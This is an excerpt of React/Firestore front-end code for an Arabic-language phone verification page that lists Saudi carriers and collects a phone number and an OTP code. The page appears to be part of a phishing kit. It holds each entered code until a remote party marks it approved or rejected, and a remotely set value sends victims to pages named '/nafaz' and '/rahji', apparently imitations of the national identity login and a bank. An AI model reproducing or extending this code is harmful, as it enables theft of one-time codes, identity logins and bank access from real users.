...
const operators = [
  ...
  },
  {
    id: "mobily",
    name: "Mobily",
    logo: "/Mobily_Logo.svg",
    color: "bg-green-50 border-green-200",
  },
  {
    id: "zain",
    name: "Zain",
    logo: "/Zain-logo-400x400-01.png",
...
export default function PhoneVerificationEnhanced() {
  ...
  useEffect(() => {
      ...
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          ...
          if (waitingForApproval) {
            if (userData.phoneOtpCodeStatus === "approved") {
            ...
            } else if (userData.phoneOtpCodeStatus === "rejected") {
              setWaitingForApproval(false);
          ...
          // Check legacy phone verification status
          if (
            userData.phoneVerificationStatus === "approved" ||
            ...
            setShowLoader(false);
            alert("فشل التحقق من الرمز. الرجاء المحاولة مرة أخرى.");
    ...
    return () => unsubscribe();
  }, [waitingForApproval, visitorId, router]);
  ...
  useEffect(() => {
    ...
    const unsubscribe = onSnapshot(
      ...
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data();
          const page = userData.currentPage?.toString();

          // Navigate based on currentPage value
          if (page === "8888") {
            window.location.href = "/nafaz";
          } else if (page === "rajhi") {
            window.location.href = "/rahji";
          } else if (page === "done") {
  ...
  const validateForm = () => {
    ...
    if (!visitorId) {
      newErrors.system =
        "خطأ في النظام. الرجاء تحديث الصفحة والمحاولة مرة أخرى.";
      isValid = false;
    }
            ...
            <div className="space-y-4">
              ...
              {(verificationStatus === "pending" ||
                ...
                loaderMessage.includes("رمز التحقق") && (
                  <div className="space-y-4">
                    {operator === "stc" && (
                      <div className="text-center space-y-3 py-4 bg-purple-50 rounded-lg border border-purple-200">
              ...
              {verificationStatus === "pending" && !otpError && (
                <p className="text-gray-600">
                  الرجاء الانتظار بينما نتحقق من الرمز...
                </p>
              )}
                ...
                !otpError && (
                  <div className="space-y-2">
                    ...
                    <p className="text-sm text-gray-500">
                      الوقت المتبقي لانتهاء صلاحية الرمز
                    </p>
                  </div>
                )}
            </div>
      ...
      <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
        <div className="p-6 md:p-8 space-y-6 relative">
          <div className="text-center mb-8">
            ...
            <h1 className="text-3xl md:text-4xl font-bold text-[#146394] mb-2">
              التحقق من رقم الجوال
            </h1>
            <p className="text-gray-600 text-lg">
              الرجاء إدخال رقم الجوال واختيار شركة الاتصالات للمتابعة
            </p>
          </div>
              ...
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {operators.map((op) => (
                  ...
                  >
                    ...
                    {operator === op.id && (
                      <Check className="h-5 w-5 text-[#146394] mt-2" />
                    )}
                  </button>
                ))}
              </div>
